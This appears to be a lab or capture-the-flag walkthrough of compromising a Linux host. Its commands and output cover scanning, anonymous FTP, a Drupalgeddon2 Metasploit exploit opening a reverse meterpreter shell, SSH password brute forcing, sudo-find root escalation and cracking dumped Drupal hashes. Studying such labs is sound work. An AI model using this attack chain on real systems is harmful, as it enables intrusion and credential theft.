## IP: `192.168.100.52`
## OS: Linux

```bash
┌──(rootkali)-[~]
└─# ping -c 3 target3.local 
PING target3.local (192.168.100.52) 56(84) bytes of data.
64 bytes from target3.local (192.168.100.52): icmp_seq=1 ttl=64 time=1.18 ms
64 bytes from target3.local (192.168.100.52): icmp_seq=2 ttl=64 time=0.897 ms
64 bytes from target3.local (192.168.100.52): icmp_seq=3 ttl=64 time=0.512 ms

--- target3.local ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms
rtt min/avg/max/mdev = 0.512/0.863/1.181/0.274 ms

```

## NMAP Script Scan with Service Scan for Full Ports

```bash
┌──(rootkali)-[~]
└─# nmap -sC -sV -p- -T4 target3.local -oN Target_3/nmap-service-detection-and-default-script-scan-full-port.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2025-09-08 17:28 IST
Nmap scan report for target3.local (192.168.100.52)
Host is up (0.0055s latency).
Not shown: 65528 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.100.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 65534    65534         318 Apr 18  2022 updates.txt
22/tcp   open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d2:1d:27:ff:c4:bc:0f:a5:76:4e:bc:fc:48:d7:b0:10 (RSA)
|   256 47:96:7a:e2:db:af:77:ac:d6:7b:e6:81:c7:58:2f:91 (ECDSA)
|_  256 af:46:03:5e:82:9d:22:65:e0:33:c7:f0:7e:be:be:20 (ED25519)
80/tcp   open  http          Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2018-02-21 17:28  drupal/
|_
139/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn   Samba smbd 4.13.17-Ubuntu (workgroup: WORKGROUP)
3306/tcp open  mysql         MySQL 5.5.5-10.3.34-MariaDB-0ubuntu0.20.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.34-MariaDB-0ubuntu0.20.04.1
|   Thread ID: 39
|   Capabilities flags: 63486
|   Some Capabilities: FoundRows, ODBCClient, SupportsTransactions, Support41Auth, IgnoreSpaceBeforeParenthesis, SupportsCompression, InteractiveClient, Speaks41ProtocolOld, IgnoreSigpipes, ConnectWithDatabase, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, Speaks41ProtocolNew, LongColumnFlag, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: P3JZgu7PmVD1h;,hL~Y!
|_  Auth Plugin Name: mysql_native_password
3389/tcp open  ms-wbt-server xrdp
MAC Address: 02:2A:A3:96:12:1D (Unknown)
Service Info: Hosts: ip-192-168-100-52.ap-south-1.compute.internal, IP-192-168-100-52; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2025-09-08T11:58:19
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: IP-192-168-100-, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.13.17-Ubuntu)
|   Computer name: ip-192-168-100-52
|   NetBIOS computer name: IP-192-168-100-52\x00
|   Domain name: ap-south-1.compute.internal
|   FQDN: ip-192-168-100-52.ap-south-1.compute.internal
|_  System time: 2025-09-08T11:58:19+00:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.28 seconds

```


## NMAP Service Scan Only for Default ports

```bash
┌──(rootkali)-[~]
└─# nmap -sV -T4 target3.local -oN Target_3/nmap-service-detection-full-port.txt                                                                                                       130 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2025-09-08 17:30 IST
Nmap scan report for target3.local (192.168.100.52)
Host is up (0.0051s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.3
22/tcp   open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.41
139/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3306/tcp open  mysql         MySQL 5.5.5-10.3.34-MariaDB-0ubuntu0.20.04.1
3389/tcp open  ms-wbt-server xrdp
MAC Address: 02:2A:A3:96:12:1D (Unknown)
Service Info: Hosts: ip-192-168-100-52.ap-south-1.compute.internal, IP-192-168-100-52; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.65 seconds

```

## Port 21 (FTP)

So, we logged in using `anonymous` login.

```bash
┌──(rootkali)-[~]
└─# ftp target3.local                                                                         
Connected to target3.local.
220 (vsFTPd 3.0.3)
Name (target3.local:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 65534    65534         318 Apr 18  2022 updates.txt
226 Directory send OK.
ftp> get updates.txt
local: updates.txt remote: updates.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for updates.txt (318 bytes).
226 Transfer complete.
318 bytes received in 0.00 secs (732.4219 kB/s)
ftp> exit
221 Goodbye.

```

```bash
┌──(rootkali)-[~]
└─# cat updates.txt 
Greetings gentlemen!

- I have setup the server successfully and have configured Drupal.
- Your Drupal usernames are exactly the same as your user account passwords on this server. Contact me to get your Drupal passwords.
- I was too busy to setup a file sharing server so i will be posting the updates here.

- admin

```

## Port 80 (Apache httpd 2.4.41)

![[Pasted image 20250908173852.png]]

So, we need to do a password spray attack 



![[Pasted image 20250908174138.png]]Upon Checking changelog we got the version.

```bash
┌──(rootkali)-[~/Target_3]
└─# searchsploit Drupal 7.57 
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                                                   | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                                                                | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                        | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                                    | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                                                           | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                                      | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                                                                                             | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                                                                                                         | php/webapps/46459.py
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                         
     
```

we are lucky af.

```bash
                                                                                                                                                                                            
┌──(rootkali)-[~/Target_3]
└─# searchsploit Drupal 7.57 
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                                                   | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                                                                | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                        | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                                    | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                                                           | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                                      | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                                                                                             | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                                                                                                         | php/webapps/46459.py
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                                                                             
┌──(rootkali)-[~/Target_3]
└─# service postgresql start && msfconsole -q
msf6 > search drupal

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
   1  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
   3  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
   4  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
   5  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE
   6  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
   7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution


Interact with a module by name or index. For example info 7, use 7 or use exploit/unix/webapp/php_xmlrpc_eval

msf6 > use 1
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > show options

Module options (exploit/unix/webapp/drupal_drupalgeddon2):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DUMP_OUTPUT  false            no        Dump payload command output
   PHP_FUNC     passthru         yes       PHP function to execute
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT        80               yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                yes       Path to Drupal install
   VHOST                         no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.100.5    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (PHP In-Memory)


msf6 exploit(unix/webapp/drupal_drupalgeddon2) > setg RHOSTS target3.local
RHOSTS => target3.local
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > setg TARGETURI drupal/
TARGETURI => drupal/
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run

[*] Started reverse TCP handler on 192.168.100.5:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending stage (39282 bytes) to 192.168.100.52
[*] Meterpreter session 1 opened (192.168.100.5:4444 -> 192.168.100.52:54734 ) at 2025-09-08 17:47:43 +0530


```



```bash
www-data@ip-192-168-100-52:/var/www/html/drupal$ cd /home
cd /home
www-data@ip-192-168-100-52:/home$ ls
ls
auditor
dbadmin
ubuntu
www-data@ip-192-168-100-52:/home$ cd auditor
cd auditor
www-data@ip-192-168-100-52:/home/auditor$ ls
ls
flag.txt
shared
www-data@ip-192-168-100-52:/home/auditor$ cat flag.txt
cat flag.txt
25176da805544c928ed1a5d3e8ccc707
www-data@ip-192-168-100-52:/home/auditor$ 

```

## Port 22 (SSH)

```bash
root@kali:~# hydra -l auditor -P rockyou.txt target3.local ssh -t 4 -I 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-08 18:00:24
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://target3.local:22/
[STATUS] 44.00 tries/min, 44 tries in 00:01h, 14344355 to do in 5433:29h, 4 active
[STATUS] 28.00 tries/min, 84 tries in 00:03h, 14344315 to do in 8538:17h, 4 active
[STATUS] 27.43 tries/min, 192 tries in 00:07h, 14344207 to do in 8716:06h, 4 active
[22][ssh] host: target3.local   login: auditor   password: qwertyuiop
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-08 18:13:34

```

Found Credentials: Username: `auditor` and password: `qwertyuiop`

```bash
root@kali:~# ssh auditor@target3.local
The authenticity of host 'target3.local (192.168.100.52)' can't be established.
ED25519 key fingerprint is SHA256:1I4QBbHImTesuKAvRuKXPJyTCgAOU6SescqTXuOMKi8.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target3.local' (ED25519) to the list of known hosts.
auditor@target3.local's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.13.0-1021-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Sep  8 13:50:11 UTC 2025

  System load:                      0.0
  Usage of /:                       19.8% of 29.02GB
  Memory usage:                     11%
  Swap usage:                       0%
  Processes:                        153
  Users logged in:                  0
  IPv4 address for br-c9cc91cc3452: 172.18.0.1
  IPv4 address for br-decc664e2ae4: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            192.168.100.52

 * Ubuntu Pro delivers the most comprehensive open source security and
   compliance features.

   https://ubuntu.com/aws/pro

46 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Apr 18 01:17:31 2022 from 197.232.131.9
auditor@ip-192-168-100-52:~$ 

```

Got the user flag.

```bash
auditor@ip-192-168-100-52:~$ cat flag.txt
25176da805544c928ed1a5d3e8ccc707
```

We need to Escalated our privileges for the root flag.

```bash
auditor@ip-192-168-100-52:/var/www/html/drupal$ sudo -l
Matching Defaults entries for auditor on ip-192-168-100-52:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User auditor may run the following commands on ip-192-168-100-52:
    (root) NOPASSWD: /usr/bin/find

```

Let's visit GTFOBins for a PrivExec Payload

```bash
auditor@ip-192-168-100-52:/var/www/html/drupal$ sudo find . -exec /bin/sh \; -quit
# /bin/bash
root@ip-192-168-100-52:/var/www/html/drupal# ls
CHANGELOG.txt      INSTALL.pgsql.txt   LICENSE.txt      UPGRADE.txt    includes     misc      robots.txt  themes      xmlrpc.php
COPYRIGHT.txt      INSTALL.sqlite.txt  MAINTAINERS.txt  authorize.php  index.php    modules   scripts     update.php
INSTALL.mysql.txt  INSTALL.txt         README.txt       cron.php       install.php  profiles  sites       web.config

```

```bash
root@ip-192-168-100-52:~# ls
Desktop  Downloads  flag.txt  snap  thinclient_drives
root@ip-192-168-100-52:~# cat flag.txt 
9f13142098984329921678d289c575e6

```


## Port 3306 (mySQL)

```bash
root@ip-192-168-100-52:/var/www/html/drupal/includes# mysql -u root -p 
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 59
Server version: 10.3.34-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 


```

Got the access of database.

```mysql
MariaDB [drupal]> show tables
    -> ;
+-----------------------------+
| Tables_in_drupal            |
+-----------------------------+
| actions                     |
| authmap                     |
| batch                       |
| block                       |
| block_custom                |
| block_node_type             |
| block_role                  |
| blocked_ips                 |
| cache                       |
| cache_block                 |
| cache_bootstrap             |
| cache_field                 |
| cache_filter                |
| cache_form                  |
| cache_image                 |
| cache_menu                  |
| cache_page                  |
| cache_path                  |
| comment                     |
| date_format_locale          |
| date_format_type            |
| date_formats                |
| field_config                |
| field_config_instance       |
| field_data_body             |
| field_data_comment_body     |
| field_data_field_image      |
| field_data_field_tags       |
| field_revision_body         |
| field_revision_comment_body |
| field_revision_field_image  |
| field_revision_field_tags   |
| file_managed                |
| file_usage                  |
| filter                      |
| filter_format               |
| flood                       |
| history                     |
| image_effects               |
| image_styles                |
| menu_custom                 |
| menu_links                  |
| menu_router                 |
| node                        |
| node_access                 |
| node_comment_statistics     |
| node_revision               |
| node_type                   |
| queue                       |
| rdf_mapping                 |
| registry                    |
| registry_file               |
| role                        |
| role_permission             |
| search_dataset              |
| search_index                |
| search_node_links           |
| search_total                |
| semaphore                   |
| sequences                   |
| sessions                    |
| shortcut_set                |
| shortcut_set_users          |
| system                      |
| taxonomy_index              |
| taxonomy_term_data          |
| taxonomy_term_hierarchy     |
| taxonomy_vocabulary         |
| url_alias                   |
| users                       |
| users_roles                 |
| variable                    |
| watchdog                    |
+-----------------------------+
73 rows in set (0.000 sec)

MariaDB [drupal]> show tables;
+-----------------------------+
| Tables_in_drupal            |
+-----------------------------+
| actions                     |
| authmap                     |
| batch                       |
| block                       |
| block_custom                |
| block_node_type             |
| block_role                  |
| blocked_ips                 |
| cache                       |
| cache_block                 |
| cache_bootstrap             |
| cache_field                 |
| cache_filter                |
| cache_form                  |
| cache_image                 |
| cache_menu                  |
| cache_page                  |
| cache_path                  |
| comment                     |
| date_format_locale          |
| date_format_type            |
| date_formats                |
| field_config                |
| field_config_instance       |
| field_data_body             |
| field_data_comment_body     |
| field_data_field_image      |
| field_data_field_tags       |
| field_revision_body         |
| field_revision_comment_body |
| field_revision_field_image  |
| field_revision_field_tags   |
| file_managed                |
| file_usage                  |
| filter                      |
| filter_format               |
| flood                       |
| history                     |
| image_effects               |
| image_styles                |
| menu_custom                 |
| menu_links                  |
| menu_router                 |
| node                        |
| node_access                 |
| node_comment_statistics     |
| node_revision               |
| node_type                   |
| queue                       |
| rdf_mapping                 |
| registry                    |
| registry_file               |
| role                        |
| role_permission             |
| search_dataset              |
| search_index                |
| search_node_links           |
| search_total                |
| semaphore                   |
| sequences                   |
| sessions                    |
| shortcut_set                |
| shortcut_set_users          |
| system                      |
| taxonomy_index              |
| taxonomy_term_data          |
| taxonomy_term_hierarchy     |
| taxonomy_vocabulary         |
| url_alias                   |
| users                       |
| users_roles                 |
| variable                    |
| watchdog                    |
+-----------------------------+
73 rows in set (0.001 sec)


```

Let's check out users.

```bash
MariaDB [drupal]> DESCRIBE users;
+------------------+------------------+------+-----+---------+-------+
| Field            | Type             | Null | Key | Default | Extra |
+------------------+------------------+------+-----+---------+-------+
| uid              | int(10) unsigned | NO   | PRI | 0       |       |
| name             | varchar(60)      | NO   | UNI |         |       |
| pass             | varchar(128)     | NO   |     |         |       |
| mail             | varchar(254)     | YES  | MUL |         |       |
| theme            | varchar(255)     | NO   |     |         |       |
| signature        | varchar(255)     | NO   |     |         |       |
| signature_format | varchar(255)     | YES  |     | NULL    |       |
| created          | int(11)          | NO   | MUL | 0       |       |
| access           | int(11)          | NO   | MUL | 0       |       |
| login            | int(11)          | NO   |     | 0       |       |
| status           | tinyint(4)       | NO   |     | 0       |       |
| timezone         | varchar(32)      | YES  |     | NULL    |       |
| language         | varchar(12)      | NO   |     |         |       |
| picture          | int(11)          | NO   | MUL | 0       |       |
| init             | varchar(254)     | YES  |     |         |       |
| data             | longblob         | YES  |     | NULL    |       |
+------------------+------------------+------+-----+---------+-------+
16 rows in set (0.002 sec)

MariaDB [drupal]> SELECT uid, name, mail, pass FROM users;
+-----+----------+----------------------+---------------------------------------------------------+
| uid | name     | mail                 | pass                                                    |
+-----+----------+----------------------+---------------------------------------------------------+
|   0 |          |                      |                                                         |
|   1 | admin    | admin@syntex.com     | $S$D67i0qFmSLMLwZ9PU7VEocSS9fvV1JaSeJxQMgCid80hGbq6wXZH |
|   2 | auditor  | auditor@syntex.com   | $S$DV.wsqkmKY3y5VW.icW/g5NTU3h.UA01nxqL9Cro27GaSBYpH4WC |
|   3 | dbadmin  | dbadmin@syntex.com   | $S$DZcGD5qcb6xso1E/Mu6DJP4uPi5DfY28kBEyuIab8Pod1saBaImN |
|   4 | Vincenzo | vincenzo@syntext.com | $S$DGnS.dK3q2FeWeNbLikdI5Hk/XdBFI2jBFkmPvv/v9Ln8vjIanIu |
+-----+----------+----------------------+---------------------------------------------------------+
5 rows in set (0.000 sec)

```

Let's crack the password of user `dbadmin`

```bash
┌──(rootkali)-[~/Target_3]
└─# john --format=drupal7 --wordlist=~/rockyou.txt dbadmin_hash.txt                                                                         1 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (Drupal7, $S$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sayang           (?)     
1g 0:00:00:00 DONE (2025-09-08 20:13) 2.500g/s 300.0p/s 300.0c/s 300.0C/s iloveme..sayang
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

## Port 139, 445 (Samba)

```bash
┌──(rootkali)-[~]
└─# nmap -p 139,445 -sV target3.local                                              

Starting Nmap 7.92 ( https://nmap.org ) at 2025-09-09 03:07 IST
Nmap scan report for target3.local (192.168.100.52)
Host is up (0.00025s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 02:2A:A3:96:12:1D (Unknown)
Service Info: Host: IP-192-168-100-52

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.50 seconds

```

```bash
root@kali:~# enum4linux 192.168.100.52
Starting enum4linux v0.8.9 ( <http://labs.portcullis.co.uk/application/enum4linux/> ) on Sat Mar 25 00:00:55 2023

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.100.52
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ====================================================== 
|    Enumerating Workgroup/Domain on 192.168.100.52    |
 ====================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================== 
|    Nbtstat Information for 192.168.100.52    |
 ============================================== 
Looking up status of 192.168.100.52
        IP-192-168-100- <00> -         B <ACTIVE>  Workstation Service
        IP-192-168-100- <03> -         B <ACTIVE>  Messenger Service
        IP-192-168-100- <20> -         B <ACTIVE>  File Server Service
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ======================================= 
|    Session Check on 192.168.100.52    |
 ======================================= 
[+] Server 192.168.100.52 allows sessions using username '', password ''

 ============================================= 
|    Getting domain SID for 192.168.100.52    |
 ============================================= 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================== 
|    OS information on 192.168.100.52    |
 ======================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 192.168.100.52 from smbclient: 
[+] Got OS info for 192.168.100.52 from srvinfo:
        IP-192-168-100-Wk Sv PrQ Unx NT SNT ip-192-168-100-52 server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 =============================== 
|    Users on 192.168.100.52    |
 =============================== 
Use of uninitialized value $users in print at ./enum4linux.pl line 874.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.

Use of uninitialized value $users in print at ./enum4linux.pl line 888.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.

 =========================================== 
|    Share Enumeration on 192.168.100.52    |
 =========================================== 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        shared          Disk      shared
        IPC$            IPC       IPC Service (ip-192-168-100-52 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            

[+] Attempting to map shares on 192.168.100.52
//192.168.100.52/print$ Mapping: DENIED, Listing: N/A
//192.168.100.52/shared Mapping: OK, Listing: OK
//192.168.100.52/IPC$   [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \\*

 ====================================================== 
|    Password Policy Information for 192.168.100.52    |
 ====================================================== 

[+] Attaching to 192.168.100.52 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] IP-192-168-100-52
        [+] Builtin

[+] Password Info for Domain: IP-192-168-100-52

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 

[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5

 ================================ 
|    Groups on 192.168.100.52    |
 ================================ 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ========================================================================= 
|    Users on 192.168.100.52 via RID cycling (RIDS: 500-550,1000-1050)    |
 ========================================================================= 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-1537581390-1319491092-4135932513
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\\ubuntu (Local User)
S-1-22-1-1001 Unix User\\auditor (Local User)
S-1-22-1-1002 Unix User\\dbadmin (Local User)
[+] Enumerating users using SID S-1-5-21-1537581390-1319491092-4135932513 and logon username '', password ''
S-1-5-21-1537581390-1319491092-4135932513-500 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-501 IP-192-168-100-52\\nobody (Local User)
S-1-5-21-1537581390-1319491092-4135932513-502 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-503 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-504 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-505 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-506 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-507 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-508 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-509 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-510 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-511 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-512 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-513 IP-192-168-100-52\\None (Domain Group)
S-1-5-21-1537581390-1319491092-4135932513-514 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-515 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-516 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-517 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-518 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-519 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-520 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-521 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-522 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-523 *unknown*\\*unknown* (8)
S-1-5-21-1537581390-1319491092-4135932513-524 *unknown*\\*unknown* (8)
